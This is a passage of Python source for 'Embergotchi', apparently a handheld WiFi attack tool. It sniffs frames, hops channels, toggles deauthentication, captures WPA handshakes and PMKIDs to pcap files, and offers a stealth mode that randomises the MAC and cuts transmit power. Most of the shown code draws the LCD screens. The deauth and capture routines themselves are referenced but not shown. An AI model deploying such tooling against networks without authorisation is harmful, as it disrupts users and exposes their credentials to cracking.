            # No targets: fast discovery sweep (2.4 + 5GHz)
            for ch in all_channels:
                if _shutdown.is_set() or not _capture_event.is_set():
                    return
                subprocess.run(
                    ["sudo", "iw", "dev", mon_iface2, "set", "channel", str(ch)],
                    capture_output=True, timeout=3,
                )
                time.sleep(0.3)


def _sniffer2():
    """Second sniffer on mon_iface2 (dual mode) — captures EAPOL after deauth."""
    if not SCAPY_OK or not mon_iface2:
        return
    try:
        scapy_sniff(
            iface=mon_iface2,
            prn=_packet_handler,
            stop_filter=lambda _: _shutdown.is_set() or not _capture_event.is_set(),
            store=0,
        )
    except Exception:
        pass


def _sniffer():
    """Sniff WiFi frames on monitor interface.

    No lfilter — adding a Python callback per packet creates a bottleneck
    on busy channels and causes the kernel buffer to overflow, dropping
    EAPOL frames. _packet_handler already checks for the layers it needs
    and returns early for irrelevant frames. We maximize the socket buffer
    to avoid drops.
    """
    if not SCAPY_OK or not mon_iface:
        return

    # Increase kernel capture buffer to 4MB (default is often 2MB)
    try:
        conf.bufsize = 4 * 1024 * 1024
    except Exception:
        pass

    try:
        scapy_sniff(
            iface=mon_iface,
            prn=_packet_handler,
            stop_filter=lambda _: _shutdown.is_set() or not _capture_event.is_set(),
            store=0,
        )
    except Exception:
        pass


def _activity_sampler():
    """Sample channel activity every 10s. Prune stale entries every 30s."""
    tick = 0
    while not _shutdown.is_set():
        if _shutdown.wait(timeout=10):
            break
        tick += 1
        with lock:
            total = sum(channel_activity.values())
            for ch in channel_activity:
                channel_activity[ch] = 0
        activity_history.append(total)
        # Prune every 30s (every 3rd tick)
        if tick % 3 == 0:
            _prune_stale()


# ---------------------------------------------------------------------------
# Animation helpers
# ---------------------------------------------------------------------------


def _update_animation():
    global _blink, _next_blink

    now = time.time()
    if _blink:
        if now > _next_blink + 0.2:
            _blink = False
            _next_blink = now + random.uniform(5, 10)
    else:
        if now >= _next_blink:
            _blink = True


# ---------------------------------------------------------------------------
# Pixel art face
# ---------------------------------------------------------------------------


FACES = {
    "awake":    "(  o . o  )",
    "happy":    "(  ^ . ^  )",
    "excited":  "(  * . *  )",
    "cool":     "(  - . -  )",
    "intense":  "(  @ . @  )",
    "bored":    "(  . . .  )",
    "lonely":   "(  ; . ;  )",
    "sad":      "(  T . T  )",
    "sleeping": "(  -  _  -  )",
    "grateful": "(  > . <  )",
    "friend":   "(  o . O  )",
    "stealth":  "(  # . #  )",
}


def _load_face_font(w, h, fallback):
    try:
        import rj_env
        px = 34 if (w >= 540 and h >= 300) else (22 if w >= 300 else (20 if w >= 200 else 13))
        return rj_env.load_font(px, bold=True, mono=True)
    except Exception:
        return fallback


def _draw_pixel_face(d, face_mood, blink, font_obj, cx=None, cy=None, w=None, h=None):
    w = w or WIDTH
    h = h or HEIGHT
    cx = (w // 2) if cx is None else cx
    cy = 20 if cy is None else cy
    face_font = _load_face_font(w, h, font_obj)
    face_text = FACES.get(face_mood, FACES["awake"])
    if blink:
        face_text = "(  -  .  -  )"
    cap = _capture_event.is_set()
    face_color = _T["accent_bright"] if cap else _T["text_muted"]
    if capture_flash > 0:
        face_color = _T["ok"]
    if stealth_enabled:
        face_color = "#C284B8"
    d.text((cx, cy), face_text, font=face_font, fill=face_color, anchor="mm")


# ---------------------------------------------------------------------------
# Sparkline
# ---------------------------------------------------------------------------


def _draw_sparkline(d, x, y, w, h, data):
    rj_theme.draw_card(
        d, (x, y, x + w, y + h),
        fill=_T["bg_well"], outline=_T["border_subtle"], radius=3,
    )
    vals = list(data) if data else []
    if not vals or max(vals) == 0:
        return
    mx = max(vals)
    inner_x = x + 3
    inner_w = max(4, w - 6)
    inner_h = max(4, h - 4)
    n = len(vals)
    step = inner_w / max(1, n)
    bw = max(1, int(step) - 1)
    for i, v in enumerate(vals):
        bh = max(0, int(v / mx * inner_h))
        bx = inner_x + int(i * step)
        if v > mx * 0.6:
            color = _T["ok"]
        elif v > mx * 0.2:
            color = _T["accent_bright"]
        else:
            color = _T["accent_dim"]
        if bh > 0:
            d.rectangle((bx, y + h - 2 - bh, min(x + w - 2, bx + bw), y + h - 2), fill=color)


# ---------------------------------------------------------------------------
# LCD Drawing -- Face view
# ---------------------------------------------------------------------------


def _draw_face(lcd, font_obj, font_sm):
    global capture_flash
    w = int(getattr(lcd, "width", WIDTH) or WIDTH)
    h = int(getattr(lcd, "height", HEIGHT) or HEIGHT)
    fonts = rj_theme.load_app_fonts(w, h)
    wide = fonts["wide"]
    large = fonts["large"]

    img = Image.new("RGB", (w, h), _T["bg_base"])
    d = ImageDraw.Draw(img)

    _update_mood()
    _update_animation()

    with lock:
        ch = current_channel
        aps = len(session_aps)
        total_clients = len(session_clients)
        hs = session_handshakes
        hhs = session_half_hs
        pm = session_pmkid
        deauths = session_deauths
        lt_hs = lifetime_handshakes
        lt_hhs = lifetime_half_hs
        lt_pm = lifetime_pmkid
        last = last_capture_ssid
        deauth_on = deauth_enabled
        stlth = stealth_enabled
        peers = len(peers_detected)
        dm = dual_mode
        local_flash = capture_flash
        if capture_flash > 0:
            capture_flash -= 1

    cap = _capture_event.is_set()

    elapsed = int(time.time() - start_time)
    h_val = elapsed // 3600
    m_val = (elapsed % 3600) // 60
    s_val = elapsed % 60
    uptime = f"{h_val:02d}:{m_val:02d}:{s_val:02d}"

    mode_parts = []
    if cap:
        mode_parts.append("AUTO")
    if deauth_on:
        mode_parts.append("DTH")
    if stlth:
        mode_parts.append("STH")
    if dm:
        mode_parts.append("2x")
    mode_str = "+".join(mode_parts) or "IDLE"

    hdr_h = rj_theme.draw_app_header(
        d, w, "EMBERGOTCHI", fonts,
        badge="HUNT" if cap else "IDLE",
        right_text=f"UP {uptime}" if wide else "",
        right_pill=f"CH {ch} | {mode_str}" if wide else "",
    )
    hint = (
        "OK:Pause  L/R:Deauth  K1:Views  K2:Stealth  K3:Exit" if (cap and wide)
        else ("OK:Hunt  L/R:Deauth  K1:Views  K2:Stealth  K3:Exit" if wide
              else ("OK:Pse L/R:Dth K1:Vw K2:Sth" if cap else "OK:Go K1:Vw K2:Sth K3:X"))
    )
    ftr_h = rj_theme.draw_app_footer(d, w, h, hint, fonts, right_text=mood.upper() if large else "")

    if local_flash > 0 and local_flash % 6 < 3:
        d.rectangle((1, 1, w - 2, h - 2), outline=_T["ok"], width=3 if wide else 2)

    pad = 10 if large else (5 if wide else 3)
    y0 = hdr_h + pad
    y1 = h - ftr_h - pad
    total_pwnd = hs + hhs + pm
    lt_total = lt_hs + lt_hhs + lt_pm

    if w >= 480:
        # Flagship HDMI Split Dashboard: Face + Sparkline (Left) | KPI Grid + Last Capture (Right)
        left_x1 = int(w * 0.47)
        face_h = int((y1 - y0) * 0.62)
        rj_theme.draw_card(
            d, (pad, y0, left_x1, y0 + face_h),
            fill=_T["bg_surface"], outline=_T["ok"] if local_flash > 0 else _T["border_accent"] if cap else _T["border_subtle"],
            radius=8, accent_left=_T["accent"] if cap else _T["text_dim"], accent_width=4,
        )
        _draw_pixel_face(d, mood, _blink, font_obj, cx=(pad + left_x1) // 2, cy=y0 + face_h // 2 - 12, w=w, h=h)

        # Mood + mode pills inside face card bottom
        px = pad + 14
        py = y0 + face_h - 28
        pw, _ = rj_theme.draw_pill(
            d, px, py, mood.upper(), fonts["badge"],
            bg=_T["select_bg"], fg=_T["accent_bright"], outline=_T["border_accent"], pad_x=6, pad_y=2,
        )
        px += pw + 6
        pw, _ = rj_theme.draw_pill(
            d, px, py, "DEAUTH ON" if deauth_on else "PASSIVE", fonts["badge"],
            bg=_T["danger_bg"] if deauth_on else _T["bg_elevated"],
            fg=_T["danger"] if deauth_on else _T["text_muted"], outline=None, pad_x=6, pad_y=2,
        )
        px += pw + 6
        if stlth:
            rj_theme.draw_pill(d, px, py, "STEALTH", fonts["badge"], bg=_T["bg_elevated"], fg="#C284B8", outline=None, pad_x=6, pad_y=2)

        # Sparkline card below face
        sp_y0 = y0 + face_h + 8
        rj_theme.draw_card(
            d, (pad, sp_y0, left_x1, y1),
            fill=_T["bg_surface"], outline=_T["border_subtle"], radius=8,
        )
        d.text((pad + 12, sp_y0 + 8), "PACKET ACTIVITY", font=fonts["badge"], fill=_T["text_muted"])
        _draw_sparkline(d, pad + 10, sp_y0 + 26, (left_x1 - pad) - 20, max(24, y1 - sp_y0 - 34), activity_history)

        # Right side: 2x2 KPI tiles + Last Capture card
        rx0 = left_x1 + 10
        rw = w - pad - rx0
        gap = 8
        tw = (rw - gap) // 2
        kh = 68
        kpis = [
            ("ACCESS POINTS", str(aps), _T["ok"]),
            ("CLIENTS", str(total_clients), _T["accent_bright"]),
            ("PWND (SESSION)", f"{hs}hs  {hhs}h  {pm}p", _T["ok"] if total_pwnd else _T["text_muted"]),
            ("LIFETIME / DTH", f"{lt_total} total | {deauths} dth", _T["warn"]),
        ]
        for idx_k, (lbl, val, acc) in enumerate(kpis):
            col_i = idx_k % 2
            row_i = idx_k // 2
            kx = rx0 + col_i * (tw + gap)
            ky = y0 + row_i * (kh + gap)
            rj_theme.draw_card(
                d, (kx, ky, kx + tw, ky + kh),
                fill=_T["bg_surface"], outline=_T["border_subtle"],
                radius=6, accent_left=acc, accent_width=4,
            )
            d.text((kx + 12, ky + 10), lbl, font=fonts["badge"], fill=_T["text_muted"])
            d.text((kx + 12, ky + 32), rj_theme.truncate_text(d, val, tw - 18, fonts["title"] if idx_k < 2 else fonts["body_bold"]), font=fonts["title"] if idx_k < 2 else fonts["body_bold"], fill=acc)

        lc_y0 = y0 + (kh + gap) * 2
        rj_theme.draw_card(
            d, (rx0, lc_y0, w - pad, y1),
            fill=_T["bg_surface"], outline=_T["ok"] if last else _T["border_subtle"],
            radius=6, accent_left=_T["ok"] if last else _T["accent_dim"], accent_width=4,
        )
        d.text((rx0 + 12, lc_y0 + 10), f"LAST CAPTURE   |   PEERS: {peers}", font=fonts["badge"], fill=_T["text_muted"])
        cap_txt = last if last else "Waiting for handshake or PMKID..."
        d.text((rx0 + 12, lc_y0 + 34), rj_theme.truncate_text(d, cap_txt, rw - 24, fonts["title"] if last else fonts["body"]), font=fonts["title"] if last else fonts["body"], fill=_T["ok"] if last else _T["text_dim"])
    elif wide:
        # Cardputer 320x170 split layout
        mid = int(w * 0.45)
        sp_h = 22
        top_bot = y1 - sp_h - 4
        rj_theme.draw_card(d, (pad, y0, mid, top_bot), fill=_T["bg_surface"], outline=_T["border_accent"] if cap else _T["border_subtle"], radius=5, accent_left=_T["accent"], accent_width=3)
        _draw_pixel_face(d, mood, _blink, font_obj, cx=(pad + mid) // 2, cy=(y0 + top_bot) // 2 - 6, w=w, h=h)
        d.text(((pad + mid) // 2, top_bot - 10), mood.upper(), font=fonts["badge"], fill=_T["accent_bright"], anchor="mm")

        rx0 = mid + 6
        rj_theme.draw_card(d, (rx0, y0, w - pad, top_bot), fill=_T["bg_surface"], outline=_T["border_subtle"], radius=5)
        tx = rx0 + 8
        mw = w - pad - tx - 4
        d.text((tx, y0 + 6), f"AP:{aps}  CLI:{total_clients}" + (f"  P:{peers}" if peers else ""), font=fonts["body_bold"], fill=_T["ok"])
        d.text((tx, y0 + 23), f"PWND:{hs}+{hhs}h+{pm}p ({lt_total})", font=fonts["body"], fill=_T["accent_bright"] if total_pwnd else _T["text_muted"])
        d.text((tx, y0 + 40), f"DTH:{deauths}  {mode_str}", font=fonts["sub"], fill=_T["warn"])
        if last:
            d.text((tx, y0 + 56), rj_theme.truncate_text(d, f">{last}", mw, fonts["sub"]), font=fonts["sub"], fill=_T["ok"])
        _draw_sparkline(d, pad, top_bot + 4, w - pad * 2, sp_h, activity_history)
    else:
        # Compact 240x240 / 128x128 native layout
        face_h = 46 if h >= 200 else 24
        rj_theme.draw_card(d, (pad, y0, w - pad, y0 + face_h), fill=_T["bg_surface"], outline=_T["border_accent"] if cap else _T["border_subtle"], radius=4)
        _draw_pixel_face(d, mood, _blink, font_obj, cx=w // 2, cy=y0 + face_h // 2, w=w, h=h)
        y = y0 + face_h + (5 if h >= 200 else 3)
        step = 16 if h >= 200 else 10
        d.text((pad + 2, y), f"CH:{ch}  {mode_str}", font=fonts["sub"], fill=_T["accent_bright"])
        y += step
        d.text((pad + 2, y), f"AP:{aps} CLI:{total_clients}" + (f" P:{peers}" if peers else ""), font=fonts["sub"], fill=_T["ok"])
        y += step
        d.text((pad + 2, y), f"PWND:{hs}+{hhs}h+{pm}p ({lt_total})", font=fonts["sub"], fill=_T["ok"] if total_pwnd else _T["text_muted"])
        y += step
        d.text((pad + 2, y), f"UP:{uptime}", font=fonts["sub"], fill=_T["text_muted"])
        y += step
        if last and y + step + 10 <= y1:
            d.text((pad + 2, y), rj_theme.truncate_text(d, f">{last}", w - pad * 2 - 4, fonts["sub"]), font=fonts["sub"], fill=_T["ok"])
            y += step
        sp_h = max(8, min(22 if h >= 200 else 12, y1 - y))
        if sp_h >= 8:
            _draw_sparkline(d, pad, y1 - sp_h, w - pad * 2, sp_h, activity_history)

    lcd.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# LCD Drawing -- Stats view
# ---------------------------------------------------------------------------


def _draw_stats(lcd, font_obj, font_sm, scroll):
    w = int(getattr(lcd, "width", WIDTH) or WIDTH)
    h = int(getattr(lcd, "height", HEIGHT) or HEIGHT)
    fonts = rj_theme.load_app_fonts(w, h)
    wide = fonts["wide"]
    large = fonts["large"]

    img = Image.new("RGB", (w, h), _T["bg_base"])
    d = ImageDraw.Draw(img)

    with lock:
        ch_act = dict(channel_total)
        cur_ch = current_channel
        aps_snap = dict(session_aps)
        clients_snap = len(session_clients)
        captured = set(captured_bssids)

    all_channels = list(range(1, 14)) + list(CHANNELS_5)
    sel_idx = max(0, min(scroll, len(all_channels) - 1))
    sel_ch = all_channels[sel_idx]
    is_5g = sel_ch > 14
    band_label = "5GHz" if is_5g else "2.4GHz"
    act_sel = ch_act.get(sel_ch, 0)

    hdr_h = rj_theme.draw_app_header(
        d, w, f"CHANNELS", fonts,
        badge=f"CH{sel_ch} {band_label}",
        right_text=f"AP:{len(aps_snap)} CLI:{clients_snap}" if wide else "",
        right_pill=f"{act_sel} PKTS" if wide else "",
    )
    ftr_h = rj_theme.draw_app_footer(
        d, w, h,
        "Left/Right:Channel  K1:Views  K3:Back" if wide else "L/R:Ch K1:Vw K3:Bk",
        fonts,
    )

    pad = 8 if large else (4 if wide else 2)
    y0 = hdr_h + pad
    y1 = h - ftr_h - pad

    # Channel bar chart card
    chart_h = 112 if large else (54 if wide else (70 if h >= 200 else 38))
    rj_theme.draw_card(d, (pad, y0, w - pad, y0 + chart_h), fill=_T["bg_surface"], outline=_T["border_subtle"], radius=6 if wide else 3)

    strip_size = len(all_channels) if w >= 480 else (16 if wide else 13)
    strip_half = strip_size // 2
    strip_start = max(0, sel_idx - strip_half)
    strip_start = min(strip_start, max(0, len(all_channels) - strip_size))
    strip_end = min(len(all_channels), strip_start + strip_size)
    strip_chs = all_channels[strip_start:strip_end]

    inner_x = pad + (10 if wide else 3)
    inner_w = (w - pad * 2) - (20 if wide else 6)
    cell_w = max(8, inner_w // max(len(strip_chs), 1))
    lbl_y = y0 + (5 if wide else 2)
    bar_top = lbl_y + (16 if large else (12 if wide else 10))
    bar_h_max = max(10, chart_h - (bar_top - y0) - (8 if wide else 4))
    max_act = max((ch_act.get(c, 0) for c in strip_chs), default=1) or 1

    for i, ch in enumerate(strip_chs):
        x = inner_x + i * cell_w
        act = ch_act.get(ch, 0)
        bh = max(2, int(act / max_act * bar_h_max)) if act > 0 else 0
        if ch == sel_ch:
            d.rectangle((x - 1, lbl_y - 1, x + cell_w - 2, lbl_y + (12 if large else 9)), fill=_T["select_bg"], outline=_T["accent"])
            ch_color = _T["accent_bright"]
            bar_color = _T["accent_bright"]
        elif ch == cur_ch:
            ch_color = _T["ok"]
            bar_color = _T["ok"]
        elif ch > 14:
            ch_color = "#C284B8" if act > 0 else _T["text_dim"]
            bar_color = "#C284B8" if act > max_act * 0.3 else _T["accent_dim"]
        elif act > max_act * 0.6:
            ch_color = _T["ok"]
            bar_color = _T["ok"]
        elif act > 0:
            ch_color = _T["warn"]
            bar_color = _T["warn"]
        else:
            ch_color = _T["text_dim"]
            bar_color = _T["bg_elevated"]

        d.text((x + 1, lbl_y), str(ch), font=fonts["badge"] if wide else fonts["sub"], fill=ch_color)
        if bh > 0:
            d.rectangle((x + 1, bar_top + bar_h_max - bh, x + cell_w - 3, bar_top + bar_h_max), fill=bar_color)
        else:
            d.line((x + 1, bar_top + bar_h_max, x + cell_w - 3, bar_top + bar_h_max), fill=_T["border_subtle"])

    # APs on selected channel
    ly = y0 + chart_h + (8 if large else (4 if wide else 3))
    aps_on_ch = [
        (bssid, info) for bssid, info in aps_snap.items()
        if info.get("channel") == sel_ch
    ]
    aps_on_ch.sort(key=lambda x: len(x[1].get("clients", set())), reverse=True)

    row_h = 24 if large else (16 if wide else (16 if h >= 200 else 10))
    rows_avail = max(1, (y1 - ly) // row_h)
    if aps_on_ch:
        for idx_r, (bssid, info) in enumerate(aps_on_ch[:rows_avail]):
            if idx_r % 2 == 0 and wide:
                d.rectangle((pad, ly, w - pad, ly + row_h - 2), fill=_T["bg_surface"])
            essid = info.get("essid", "?")
            cli = len(info.get("clients", set()))
            sig = info.get("signal", -99)
            is_cap = bssid in captured
            rx = w - pad - (8 if wide else 3)
            sig_txt = f"{sig}dB" if wide else f"{sig}"
            sw = rj_theme.measure_text(fonts["sub"], sig_txt, d)[2]
            d.text((rx - sw, ly + (4 if large else 1)), sig_txt, font=fonts["sub"], fill=_T["text_muted"])
            rx -= sw + (8 if wide else 4)
            cli_txt = f"{cli} cli" if wide else f"{cli}c"
            cw_p = rj_theme.measure_text(fonts["sub"], cli_txt, d)[2]
            d.text((rx - cw_p, ly + (4 if large else 1)), cli_txt, font=fonts["sub"], fill=_T["warn"] if cli else _T["text_dim"])
            rx -= cw_p + (10 if wide else 4)
            if large:
                bw = rj_theme.measure_text(fonts["mono"], bssid, d)[2]
                d.text((rx - bw, ly + 4), bssid, font=fonts["mono"], fill=_T["text_dim"])
                rx -= bw + 10
            tx = pad + (8 if wide else 3)
            if is_cap and wide:
                pw, _ = rj_theme.draw_pill(d, tx, ly + (2 if large else 1), "PWND", fonts["badge"], bg=_T["ok_bg"], fg=_T["ok"], outline=None, pad_x=4, pad_y=1)
                tx += pw + 6
            label = essid if wide else f"{'!' if is_cap else ' '}{essid}"
            d.text((tx, ly + (3 if large else 1)), rj_theme.truncate_text(d, label, max(24, rx - tx - 2), fonts["body_bold"] if wide else fonts["sub"]), font=fonts["body_bold"] if wide else fonts["sub"], fill=_T["ok"] if is_cap else _T["text_primary"])
            ly += row_h
    else:
        d.text((pad + 8, ly + 4), f"CH {sel_ch}: No APs observed yet", font=fonts["body"] if wide else fonts["sub"], fill=_T["text_dim"])

    lcd.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# LCD Drawing -- Captures view
# ---------------------------------------------------------------------------


_captures_cache = {"files": [], "ts": 0}

def _list_captures():
    # Cache for 3 seconds to avoid os.listdir every frame
    now = time.time()
    if now - _captures_cache["ts"] < 3 and _captures_cache["files"]:
        return _captures_cache["files"]
    _captures_cache["ts"] = now
    if not os.path.isdir(HANDSHAKE_DIR):
        return []
    try:
        files = [f for f in os.listdir(HANDSHAKE_DIR) if f.endswith(".pcap")]
        files.sort(reverse=True)
        _captures_cache["files"] = files
        return files
    except Exception:
        return []


def _draw_captures(lcd, font_obj, font_sm, scroll):
    w = int(getattr(lcd, "width", WIDTH) or WIDTH)
    h = int(getattr(lcd, "height", HEIGHT) or HEIGHT)
    fonts = rj_theme.load_app_fonts(w, h)
    wide = fonts["wide"]
    large = fonts["large"]

    img = Image.new("RGB", (w, h), _T["bg_base"])
    d = ImageDraw.Draw(img)

    captures = _list_captures()
    count = len(captures)

    hdr_h = rj_theme.draw_app_header(d, w, "CAPTURES", fonts, badge=f"{count} PCAP", right_text=HANDSHAKE_DIR if large else "")
    ftr_h = rj_theme.draw_app_footer(d, w, h, "Up/Dn:Scroll   K1:Views   K3:Back" if wide else "U/D:Scrl K1:Vw K3:Bk", fonts)

    pad = 8 if large else (4 if wide else 2)
    y0 = hdr_h + pad
    y1 = h - ftr_h - pad

    if not captures:
        rj_theme.draw_status_card(d, w, h, "No Captures Yet", sub="Press OK on Face view to start hunting", kind="info", fonts=fonts)
    else:
        row_h = 26 if large else (20 if wide else 14)
        vis = max(1, (y1 - y0) // row_h)
        start = max(0, min(scroll, max(0, count - vis)))
        for i, fname in enumerate(captures[start:start + vis]):
            y = y0 + i * row_h
            name_display = fname.replace(".pcap", "")
            if fname.startswith("hs4_"):
                color, tag, bg = _T["ok"], "HS4", _T["ok_bg"]
            elif fname.startswith("hs_half_"):
                color, tag, bg = _T["warn"], "HALF", _T["warn_bg"]
            elif fname.startswith("pmkid_"):
                color, tag, bg = _T["accent_bright"], "PMKID", _T["select_bg"]
            else:
                color, tag, bg = _T["text_primary"], "CAP", _T["bg_elevated"]
            if i % 2 == 0 and wide:
                d.rectangle((pad, y, w - pad - 5, y + row_h - 2), fill=_T["bg_surface"])
            tx = pad + (6 if wide else 2)
            if wide:
                pw, _ = rj_theme.draw_pill(d, tx, y + max(1, (row_h - 15) // 2), tag, fonts["badge"], bg=bg, fg=color, outline=None, pad_x=5, pad_y=1)
                tx += pw + 8
                d.text((tx, y + max(1, (row_h - 13) // 2)), rj_theme.truncate_text(d, name_display, w - pad - tx - 10, fonts["body"]), font=fonts["body"], fill=_T["text_primary"])
            else:
                d.text((tx, y + 1), rj_theme.truncate_text(d, f"[{tag[0]}] {name_display}", w - pad * 2 - 6, fonts["sub"]), font=fonts["sub"], fill=color)
        if count > vis:
            rj_theme.draw_scrollbar(d, w - 5, y0, y1, start, vis, count, width=3)

    lcd.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# LCD Drawing -- Whitelist view
# ---------------------------------------------------------------------------


def _draw_whitelist(lcd, font_obj, font_sm, scroll):
    w = int(getattr(lcd, "width", WIDTH) or WIDTH)
    h = int(getattr(lcd, "height", HEIGHT) or HEIGHT)
    fonts = rj_theme.load_app_fonts(w, h)
    wide = fonts["wide"]
    large = fonts["large"]

    img = Image.new("RGB", (w, h), _T["bg_base"])
    d = ImageDraw.Draw(img)

    lines = [("MAC", mac) for mac in sorted(whitelist_macs)] + [("SSID", ssid) for ssid in sorted(whitelist_ssids)]
    hdr_h = rj_theme.draw_app_header(d, w, "WHITELIST", fonts, badge=f"{len(lines)} RULES", right_text=CONFIG_FILE if large else "")
    ftr_h = rj_theme.draw_app_footer(d, w, h, "Up/Dn:Scroll   K1:Views   K3:Back" if wide else f"{len(lines)} rules K1:Vw K3:X", fonts)

    pad = 8 if large else (4 if wide else 2)
    y0 = hdr_h + pad
    y1 = h - ftr_h - pad

    if not lines:
        rj_theme.draw_status_card(
            d, w, h, "Whitelist Empty",
            sub=f"Edit {os.path.basename(CONFIG_FILE)} in loot/Pwnagotchi",
            kind="warn", foot="Add your own SSID/MAC to protect from deauth", fonts=fonts,
        )
    else:
        row_h = 26 if large else (20 if wide else 13)
        vis = max(1, (y1 - y0) // row_h)
        start = max(0, min(scroll, max(0, len(lines) - vis)))
        for i, (kind, val) in enumerate(lines[start:start + vis]):
            y = y0 + i * row_h
            if i % 2 == 0 and wide:
                d.rectangle((pad, y, w - pad - 5, y + row_h - 2), fill=_T["bg_surface"])
            tx = pad + (6 if wide else 2)
            if wide:
                pw, _ = rj_theme.draw_pill(d, tx, y + max(1, (row_h - 15) // 2), kind, fonts["badge"], bg=_T["select_bg"], fg=_T["accent_bright"], outline=None, pad_x=5, pad_y=1)
                d.text((tx + pw + 8, y + max(1, (row_h - 13) // 2)), rj_theme.truncate_text(d, val, w - pad - tx - pw - 16, fonts["mono"] if kind == "MAC" else fonts["body"]), font=fonts["mono"] if kind == "MAC" else fonts["body"], fill=_T["text_primary"])
            else:
                d.text((tx, y + 1), rj_theme.truncate_text(d, f"{kind} {val}", w - pad * 2 - 6, fonts["sub"]), font=fonts["sub"], fill=_T["text_primary"])
        if len(lines) > vis:
            rj_theme.draw_scrollbar(d, w - 5, y0, y1, start, vis, len(lines), width=3)

    lcd.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Dual card selection
# ---------------------------------------------------------------------------


def _show_lcd_message(lcd, font, text, color="#FF4444", duration=2):
    w = int(getattr(lcd, "width", WIDTH) or WIDTH)
    h = int(getattr(lcd, "height", HEIGHT) or HEIGHT)
    fonts = rj_theme.load_app_fonts(w, h)
    img = Image.new("RGB", (w, h), _T["bg_base"])
    d = ImageDraw.Draw(img)
    rj_theme.draw_app_header(d, w, "EMBERGOTCHI", fonts, badge="STATUS")
    kind = "err" if color in ("#FF0000", "#FF4444", _T["danger"]) else "warn" if color in ("#FFAA00", _T["warn"]) else "ok"
    rj_theme.draw_status_card(d, w, h, str(text), kind=kind, fonts=fonts)
    lcd.LCD_ShowImage(img, 0, 0)
    time.sleep(duration)


def _select_dual_prompt(lcd, font, font_sm, second_name):
    """Ask user if they want dual mode. Returns True/False."""
    w = int(getattr(lcd, "width", WIDTH) or WIDTH)
    h = int(getattr(lcd, "height", HEIGHT) or HEIGHT)
    fonts = rj_theme.load_app_fonts(w, h)
    img = Image.new("RGB", (w, h), _T["bg_base"])
    d = ImageDraw.Draw(img)
    rj_theme.draw_app_header(d, w, "EMBERGOTCHI", fonts, badge="DUAL CARD")
    rj_theme.draw_status_card(
        d, w, h, "2nd WiFi Card Detected!",
        sub=f"{second_name}  |  Enable Dual Sniffer + Attacker?",
        kind="ok", foot="OK / Enter: Dual Mode   KEY3 / Esc: Single", fonts=fonts,
    )
    rj_theme.draw_app_footer(d, w, h, "OK:Enable Dual   KEY3:Single Card", fonts)
    lcd.LCD_ShowImage(img, 0, 0)

    while True:
        btn = get_button(PINS, GPIO)
        if btn == "OK":
            return True
        if btn == "KEY3":
            return False
        time.sleep(0.05)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------


def main():
    global deauth_enabled, stealth_enabled
    global mon_iface, mon_iface2, dual_mode, view, original_mac, capture_flash

    capture_flash = 0
    os.makedirs(HANDSHAKE_DIR, exist_ok=True)
    _load_stats()
    _load_config()

    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    LCD_Config.GPIO_Init()
    lcd = LCD_1in44.LCD()
    lcd.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    lcd.LCD_Clear()
    font_obj = scaled_font(10)
    font_sm = scaled_font(8)

    if not SCAPY_OK:
        _show_lcd_message(lcd, font_obj, "scapy not found!", "#FF0000", 3)
        GPIO.cleanup()
        return 1

    # --- Interface selection ---
    iface = select_interface(lcd, font_obj, PINS, GPIO, iface_type="wifi",
                             require_monitor=True)
    if not iface:
        GPIO.cleanup()
        return 1

    original_mac = _get_mac(iface)

    # Check for second monitor-capable card
    all_mon = [
        i for i in list_interfaces("wifi")
        if i.get("supports_monitor") and i["name"] != iface
    ]
    iface2 = None
    if all_mon:
        # Debounce: wait for button release after interface selection
        time.sleep(0.5)
        while get_button(PINS, GPIO) is not None:
            time.sleep(0.1)
        if _select_dual_prompt(lcd, font_obj, font_sm, all_mon[0]["name"]):
            iface2 = all_mon[0]["name"]

    # --- Monitor mode ---
    _show_lcd_message(lcd, font_obj, f"Enabling monitor: {iface}", _T["warn"], 0.1)

    mon_iface = _monitor_up(iface)
    if not mon_iface:
        _show_lcd_message(lcd, font_obj, f"Monitor fail: {iface}", _T["danger"], 3)
        _show_lcd_message(lcd, font_obj, "Check dongle support", _T["warn"], 3)
        GPIO.cleanup()
        return 1

    # Second card monitor mode
    if iface2:
        _show_lcd_message(lcd, font_obj, f"Enabling monitor: {iface2}", _T["warn"], 0.1)

        mon_iface2 = _monitor_up(iface2)
        if mon_iface2:
            dual_mode = True
        else:
            _show_lcd_message(lcd, font_obj, "Card2 fail, single mode", _T["warn"], 2)

    # Start activity sampler
    threading.Thread(target=_activity_sampler, daemon=True).start()

    scroll = 0

    try:
        while not _shutdown.is_set():
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                if view != "face":
                    view = "face"
                    time.sleep(0.3)
                else:
                    break

            elif btn == "OK":
                if not _capture_event.is_set():
                    # Only start threads if none are alive
                    alive = any(t.is_alive() for t in _scan_threads)
                    if not alive:
                        _scan_threads.clear()
                        _capture_event.set()
                        for target in [_channel_hopper, _sniffer, _half_hs_checker]:
                            t = threading.Thread(target=target, daemon=True)
                            t.start()
                            _scan_threads.append(t)
                        if dual_mode and mon_iface2:
                            # Attack hopper on card 2
                            t = threading.Thread(target=_attack_hopper, daemon=True)
                            t.start()
                            _scan_threads.append(t)
                            # Second sniffer on card 2 (captures EAPOL right after deauth)
                            t = threading.Thread(target=_sniffer2, daemon=True)
                            t.start()
                            _scan_threads.append(t)
                else:
                    _capture_event.clear()
                time.sleep(0.3)

            elif btn in ("LEFT", "RIGHT") and view == "face":
                deauth_enabled = not deauth_enabled
                _save_config()
                time.sleep(0.3)

            elif btn == "LEFT" and view == "stats":
                scroll = max(0, scroll - 1)
                time.sleep(0.15)

            elif btn == "RIGHT" and view == "stats":
                scroll += 1
                time.sleep(0.15)

            elif btn == "KEY1":
                if view == "face":
                    view = "stats"
                elif view == "stats":
                    view = "captures"
                elif view == "captures":
                    view = "whitelist"
                else:
                    view = "face"
                scroll = 0
                time.sleep(0.3)

            elif btn == "KEY2":
                stealth_enabled = not stealth_enabled
                if stealth_enabled and mon_iface:
                    _randomize_mac(mon_iface)
                    _reduce_tx_power(mon_iface)
                elif not stealth_enabled and mon_iface:
                    _restore_mac(mon_iface, original_mac)
                    _restore_tx_power(mon_iface)
